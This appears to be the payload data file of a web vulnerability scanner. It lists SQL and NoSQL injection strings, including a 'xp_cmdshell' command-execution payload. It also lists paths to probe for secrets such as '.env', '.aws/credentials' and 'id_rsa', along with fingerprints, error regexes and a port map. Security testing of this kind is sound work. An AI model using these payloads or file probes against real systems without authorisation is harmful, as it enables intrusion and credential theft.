"""
payloads.py - Advanced Payloads, CVE Signatures, and Fingerprints (2026 Standard)
"""

SQL_INJECTION_PAYLOADS = [
    # Basic Detection
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1 -- ",
    "1' OR '1'='1' UNION SELECT NULL, NULL, NULL -- ",
    
    # Error Based (Trigger DB Errors)
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) -- ",
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- ",
    
    # Blind Boolean
    "' AND 1=1 -- ",
    "' AND 1=2 -- ",
    
    # Time Based (Advanced)
    "'; WAITFOR DELAY '0:0:5' -- ",
    "' AND SLEEP(5) -- ",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
    
    # Union Based (Extract Data)
    "' UNION SELECT 1,2,3,4,5 -- ",
    "' UNION SELECT NULL, table_name, NULL, NULL, NULL FROM information_schema.tables -- ",
    
    # MSSQL Specific
    "'; EXEC xp_cmdshell('whoami') -- ",
    
    # PostgreSQL Specific
    "'; COPY (SELECT version()) TO '/tmp/test.txt'; -- ",
    
    # NoSQL Injection (MongoDB style)
    "{\"$ne\": null}",
    "{\"$gt\": \"\"}",
]

NOSQL_INJECTION_PAYLOADS = [
    "true, $where: '1 == 1'",
    "; return this.username.match(/admin/); var x=",
    "{\"username\": {\"$regex\": \".*\"}, \"password\": {\"$ne\": \"wrong\"}}",
]

SENSITIVE_FILES = [
    ".env",
    ".git/config",
    "wp-config.php.bak",
    "config.php.bak",
    "database.sql",
    "dump.sql",
    "backup.zip",
    "phpmyadmin/index.php",
    "pma/index.php",
    "adminer.php",
    ".aws/credentials",
    "id_rsa",
    ".ssh/authorized_keys",
    "web.config",
    ".htaccess",
    "server-status",
    "elmah.axd", # ASP.NET error log
    "debug.seam",
]

TECH_FINGERPRINTS = {
    "WordPress": ["wp-content", "wp-includes", "wp-json"],
    "Joomla": ["media/jui", "components/com_content"],
    "Drupal": ["sites/default/files", "Drupal.settings"],
    "Apache": ["Server: Apache", "indexof /"],
    "Nginx": ["Server: nginx"],
    "IIS": ["Server: Microsoft-IIS", "X-Powered-By: ASP.NET"],
    "PHP": ["X-Powered-By: PHP"],
    "Tomcat": ["Apache Tomcat"],
    "Django": ["csrftoken", "Set-Cookie: sessionid"],
    "Flask": ["Werkzeug"],
}

CVE_DATABASE = {
    # Example CVE mappings based on versions detected
    "CVE-2021-44228": {"name": "Log4Shell", "tech": "Log4j", "severity": "CRITICAL"},
    "CVE-2023-44487": {"name": "HTTP/2 Rapid Reset", "tech": "HTTP/2", "severity": "HIGH"},
    "CVE-2024-27198": {"name": "JetBrains TeamCity Auth Bypass", "tech": "TeamCity", "severity": "CRITICAL"},
    # Dynamic lookup would happen here in a real enterprise tool via API
}

ERROR_PATTERNS = {
    "MySQL": ["SQL syntax.*MySQL", "Warning.*mysql_", "Unclosed quotation mark"],
    "PostgreSQL": ["PostgreSQL.*ERROR", "Warning.*pg_"],
    "MSSQL": ["Microsoft SQL Server", "OLE DB provider", "Unclosed quotation mark"],
    "Oracle": ["ORA-[0-9]{5}", "Oracle.*Driver"],
    "SQLite": ["SQLite/JDBC", "near.*syntax error"],
}

HEADERS_TO_ANALYZE = [
    "Strict-Transport-Security",
    "Content-Security-Policy",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "X-XSS-Protection",
    "Permissions-Policy",
    "Access-Control-Allow-Origin"
]

PORT_SERVICES = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 443: "HTTPS", 445: "SMB", 3306: "MySQL", 
    5432: "PostgreSQL", 1433: "MSSQL", 27017: "MongoDB",
    6379: "Redis", 8080: "HTTP-Proxy", 9200: "Elasticsearch"
}
